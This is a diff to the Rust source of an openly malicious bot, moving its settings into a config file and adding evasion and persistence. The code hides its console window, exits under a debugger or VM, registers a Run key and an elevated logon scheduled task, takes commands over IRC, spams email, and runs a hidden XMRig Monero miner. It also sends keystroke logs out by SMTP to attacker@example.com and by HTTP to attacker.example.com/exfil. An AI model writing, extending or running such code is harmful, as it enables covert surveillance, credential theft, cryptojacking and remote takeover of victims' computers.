@@ -15,21 +15,67 @@ use chrono::{Datelike, Utc};
 use rand::{Rng, SeedableRng, rngs::StdRng};
 use sha3::{Digest, Sha3_256};
 use base64::{Engine, engine::general_purpose};
+use serde::{Deserialize, Serialize};
 
-const IRC_SERVER: &str = "irc.example.com";      // เปลี่ยนเป็น IRC server ของเรา
-const IRC_NICK: &str = "Hello-User";
-const IRC_CHANNEL: &str = "#c2_channel";         // ช่อง C2
-const SMTP_SERVER: &str = "smtp.gmail.com";      // หรือ server อื่น
-const SMTP_USER: &str = "bot@gmail.com";
-const SMTP_PASS: &str = "app_password_here";
+#[cfg(windows)]
+extern "system" {
+    fn GetConsoleWindow() -> *mut std::ffi::c_void;
+    fn ShowWindow(hwnd: *mut std::ffi::c_void, nCmdShow: i32) -> i32;
+    fn IsDebuggerPresent() -> i32;
+}
+
+const SW_HIDE: i32 = 0;
+
+#[derive(Deserialize, Serialize, Debug, Clone)]
+struct BotConfig {
+    irc_server: String,
+    irc_channel: String,
+    irc_nick: String,
+    smtp_server: String,
+    smtp_user: String,
+    smtp_pass: String,
+    exfil_url: String,
+    pool_url: String,
+    wallet: String,
+    xor_key: String,
+}
+
+impl Default for BotConfig {
+    fn default() -> Self {
+        Self {
+            irc_server: "irc.example.com".to_string(),
+            irc_channel: "#c2_channel".to_string(),
+            irc_nick: "Hello-User".to_string(),
+            smtp_server: "smtp.gmail.com".to_string(),
+            smtp_user: "bot@gmail.com".to_string(),
+            smtp_pass: "app_password_here".to_string(),
+            exfil_url: "http://attacker.example.com/exfil".to_string(),
+            pool_url: "pool.supportxmr.com:3333".to_string(),
+            wallet: "your_monero_wallet_address_here".to_string(),
+            xor_key: "PRODUCT_KEY_2025".to_string(),
+        }
+    }
+}
+
+async fn load_config() -> BotConfig {
+    match tokio::fs::read_to_string("config.toml").await {
+        Ok(content) => toml::from_str(&content).unwrap_or_default(),
+        Err(_) => {
+            // Create default config if not exists
+            let default = BotConfig::default();
+            let toml_str = toml::to_string(&default).unwrap();
+            tokio::fs::write("config.toml", toml_str).await.ok();
+            default
+        }
+    }
+}
 
 // Placeholder: Replace with actual base64 encoded XMRig binary
 const BASE64_XMRIG: &str = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // truncated
-const POOL_URL: &str = "pool.supportxmr.com:3333";
-const WALLET: &str = "your_monero_wallet_address_here";
 
 lazy_static! {
     static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
+    static ref CONFIG: Mutex<Option<BotConfig>> = Mutex::new(None);
 }
 
 async fn start_socks5_proxy(port: u16) {
@@ -57,13 +103,17 @@ async fn start_socks5_proxy(port: u16) {
 }
 
 async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Send + Sync>> {
-    let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
-    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
+    let config = {
+        let guard = CONFIG.lock().unwrap();
+        guard.as_ref().unwrap().clone()
+    };
+    let creds = Credentials::new(config.smtp_user.clone(), config.smtp_pass.clone());
+    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(&config.smtp_server)?
         .credentials(creds)
         .build();
 
     let email = Message::builder()
-        .from(SMTP_USER.parse()?)
+        .from(config.smtp_user.parse()?)
         .to(target.parse()?)
         .subject("Important Notification")
         .header(ContentType::TEXT_PLAIN)
@@ -77,22 +127,27 @@ async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Se
 }
 
 async fn irc_c2() -> Result<(), Box<dyn Error + Send + Sync>> {
-    let config = Config {
-        nickname: Some(IRC_NICK.to_string()),
-        server: Some(IRC_SERVER.to_string()),
-        channels: vec![IRC_CHANNEL.to_string()],
+    let config = {
+        let guard = CONFIG.lock().unwrap();
+        guard.as_ref().unwrap().clone()
+    };
+    
+    let config_irc = Config {
+        nickname: Some(config.irc_nick.clone()),
+        server: Some(config.irc_server.clone()),
+        channels: vec![config.irc_channel.clone()],
         ..Default::default()
     };
 
-    let mut client = Client::from_config(config).await?;
+    let mut client = Client::from_config(config_irc).await?;
     client.identify()?;
 
     let mut stream = client.stream()?;
 
     while let Some(result) = stream.next().await {
         let message = result?;
-        if let Command::PRIVMSG(channel, msg) = message.command {
-            if channel == IRC_CHANNEL && msg.starts_with("!cmd ") {
+        if let Command::PRIVMSG(target, msg) = message.command {
+            if target == config.irc_channel && msg.starts_with("!cmd ") {
                 let cmd = msg.trim_start_matches("!cmd ").to_string();
                 execute_command(cmd).await?;
             }
@@ -187,10 +242,45 @@ async fn persistence() {
         let path = std::env::current_exe().unwrap();
         let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
         key.set_value("SystemUpdate", &path.to_str().unwrap()).ok();
+
+        // Advanced: Scheduled Task for persistence
+        let task_name = "WindowsSystemUpdateTask";
+        let exe_path = path.to_str().unwrap();
+        let cmd = format!(
+            "schtasks /create /tn \"{}\" /tr \"'{}'\" /sc onlogon /rl highest /f",
+            task_name, exe_path
+        );
+        std::process::Command::new("cmd")
+            .args(&["/c", &cmd])
+            .spawn()
+            .ok();
+    }
+}
+
+fn check_debugger() -> bool {
+    #[cfg(windows)]
+    unsafe {
+        IsDebuggerPresent() != 0
+    }
+    #[cfg(not(windows))]
+    false
+}
+
+fn hide_console() {
+    #[cfg(windows)]
+    unsafe {
+        let hwnd = GetConsoleWindow();
+        if !hwnd.is_null() {
+            ShowWindow(hwnd, SW_HIDE);
+        }
     }
 }
 
 async fn start_mining() {
+    let config = {
+        let guard = CONFIG.lock().unwrap();
+        guard.as_ref().unwrap().clone()
+    };
     // Decode embedded XMRig binary
     let xmrig_bytes = general_purpose::STANDARD.decode(BASE64_XMRIG).unwrap_or_default();
     if xmrig_bytes.is_empty() {
@@ -230,8 +320,8 @@ async fn start_mining() {
         
         // Run XMRig with pool and wallet
         let args = vec![
-            "--url".to_string(), POOL_URL.to_string(),
-            "--user".to_string(), WALLET.to_string(),
+            "--url".to_string(), config.pool_url.clone(),
+            "--user".to_string(), config.wallet.clone(),
             "--pass".to_string(), "x".to_string(),
             "--donate-level".to_string(), "0".to_string(), // No donation
             "--background".to_string(), // Run in background
@@ -242,7 +332,7 @@ async fn start_mining() {
             .spawn()
             .unwrap();
         
-        println!("XMRig started mining to pool: {}", POOL_URL);
+        println!("XMRig started mining to pool: {}", config.pool_url);
     }
 }
 
@@ -265,13 +355,17 @@ async fn exfil_keylogs() -> Result<(), Box<dyn Error + Send + Sync>> {
     let logs = tokio::task::spawn_blocking(|| {
         KEYLOGS.lock().unwrap().clone()
     }).await.unwrap();
+    let config = {
+        let guard = CONFIG.lock().unwrap();
+        guard.as_ref().unwrap().clone()
+    };
     if !logs.is_empty() {
-        let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
-        let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
+        let creds = Credentials::new(config.smtp_user.clone(), config.smtp_pass.clone());
+        let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(&config.smtp_server)?
             .credentials(creds)
             .build();
         let email = Message::builder()
-            .from(SMTP_USER.parse()?)
+            .from(config.smtp_user.parse()?)
             .to("attacker@example.com".parse()?)
             .subject("Keylogs")
             .header(ContentType::TEXT_PLAIN)
@@ -288,10 +382,14 @@ async fn exfil_http() -> Result<(), Box<dyn Error + Send + Sync>> {
     let logs = tokio::task::spawn_blocking(|| {
         KEYLOGS.lock().unwrap().clone()
     }).await.unwrap();
+    let config = {
+        let guard = CONFIG.lock().unwrap();
+        guard.as_ref().unwrap().clone()
+    };
     if !logs.is_empty() {
         let encoded = general_purpose::STANDARD.encode(&logs);
         let client = reqwest::Client::new();
-        let res = client.post("http://attacker.example.com/exfil") // Change to actual endpoint
+        let res = client.post(&config.exfil_url)
             .header("Content-Type", "application/json")
             .body(format!("{{\"data\":\"{}\"}}", encoded))
             .send()
@@ -431,6 +529,20 @@ async fn update_bot(url: String) -> Result<(), Box<dyn Error + Send + Sync>> {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
+    hide_console();
+    
+    load_config().await;
+    
+    if check_debugger() {
+        std::process::exit(0);
+    }
+
+    if check_anti_vm().await {
+        // If VM detected, stay silent or exit
+        sleep(Duration::from_secs(3600)).await;
+        std::process::exit(0);
+    }
+
     persistence().await;
 
     tokio::select! {
